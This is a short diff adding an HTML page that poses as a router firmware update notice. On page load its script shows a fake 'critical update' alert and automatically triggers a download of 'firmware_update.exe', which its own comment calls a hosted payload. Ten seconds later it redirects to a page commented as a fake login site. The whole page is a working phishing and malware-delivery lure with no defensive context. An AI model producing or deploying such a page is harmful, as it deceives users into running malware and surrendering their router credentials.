@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Router Update</title>
+  <script>
+window.onload = function() {
+  alert("Your router requires a critical firmware update.\nClick OK to download the latest update."); // Displays alert to prompt download
+  window.location.href = "firmware_update.exe"; // Automatically triggers download of hosted payload
+  setTimeout(() => {
+    window.location.href = "login.html"; // fake login site
+  }, 10000); // 10 seconds delay to give authentic redirect to fake login
+};
+
+  </script>
+</head>
+<body>
+  <h3>Firmware Update Required</h3>
+  <p>Please download the latest update to continue using your router without interruptions.</p>
+</body>
+</html>
+
